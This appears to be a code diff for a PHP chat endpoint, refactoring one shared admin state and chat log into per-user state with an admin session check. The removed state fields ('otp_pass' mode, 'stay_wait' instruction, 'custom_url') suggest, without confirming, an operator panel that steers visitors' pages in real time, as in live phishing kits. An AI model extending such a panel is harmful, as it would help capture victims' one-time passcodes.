@@ -1,64 +1,43 @@
 <?php
 session_start();
-
-$stateFile = __DIR__ . '/admin_state.json';
-$chatFile = __DIR__ . '/chat_log.json';
+require_once __DIR__ . '/lib/user_panel.php';
 
 header('Content-Type: application/json');
 
-function loadState($file)
+function sanitizeUserId($value)
 {
-    $defaults = [
-        'mode' => 'default',
-        'custom_url' => '',
-        'instruction' => 'stay_wait',
-        'instruction_token' => time(),
-        'chat_enabled' => false
-    ];
-
-    if (!file_exists($file)) {
-        return $defaults;
-    }
-
-    $data = json_decode(file_get_contents($file), true);
-    $state = is_array($data) ? array_merge($defaults, $data) : $defaults;
-
-    if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
-        $state['mode'] = 'default';
-        $state['instruction'] = $state['instruction'] ?? 'otp_pass';
-    }
-
-    if (empty($state['instruction_token'])) {
-        $state['instruction_token'] = time();
-    }
-
-    return $state;
-}
-
-function loadChat($file)
-{
-    if (!file_exists($file)) {
-        return [];
-    }
-
-    $data = json_decode(file_get_contents($file), true);
-    return is_array($data) ? $data : [];
-}
-
-function saveChat($file, $messages)
-{
-    file_put_contents($file, json_encode($messages, JSON_PRETTY_PRINT));
+    return preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $value);
 }
 
 $action = $_GET['action'] ?? 'fetch';
-$state = loadState($stateFile);
+$isAdmin = !empty($_SESSION['is_admin']);
+$currentUserId = panelCurrentUserId();
+$requestedUserId = sanitizeUserId($_GET['user_id'] ?? $_POST['user_id'] ?? '');
+$targetUserId = $isAdmin ? ($requestedUserId ?: '') : $currentUserId;
+
+if ($isAdmin && $targetUserId === '') {
+    echo json_encode([
+        'chat_enabled' => false,
+        'messages' => [],
+        'error' => 'Missing user_id.'
+    ]);
+    exit;
+}
+
+if ($targetUserId === '') {
+    http_response_code(400);
+    echo json_encode(['error' => 'Invalid user id.']);
+    exit;
+}
+
+$state = panelLoadState($targetUserId);
 $chatEnabled = !empty($state['chat_enabled']);
 
 if ($action === 'send') {
     $sender = $_POST['sender'] ?? '';
     $message = trim($_POST['message'] ?? '');
 
-    if ($sender === 'admin' && empty($_SESSION['is_admin'])) {
+    if ($sender === 'admin' && !$isAdmin) {
         http_response_code(403);
         echo json_encode(['error' => 'Not authorized.']);
         exit;
@@ -76,29 +55,20 @@ if ($action === 'send') {
         exit;
     }
 
-    $messages = loadChat($chatFile);
-    $messages[] = [
-        'sender' => $sender === 'admin' ? 'admin' : 'user',
-        'message' => $message,
-        'timestamp' => time()
-    ];
-
-    saveChat($chatFile, $messages);
+    panelAppendChat($targetUserId, $sender === 'admin' ? 'admin' : 'user', $message);
 
     echo json_encode(['success' => true]);
     exit;
 }
 
-$messages = loadChat($chatFile);
-
+$messages = panelLoadChat($targetUserId);
 $formatted = array_map(function ($entry) {
     $entry['formatted'] = date('Y-m-d H:i:s', $entry['timestamp']);
     return $entry;
 }, $messages);
 
-header('Content-Type: application/json');
-
 echo json_encode([
     'chat_enabled' => $chatEnabled,
     'messages' => $formatted,
+    'user_id' => $targetUserId,
 ]);
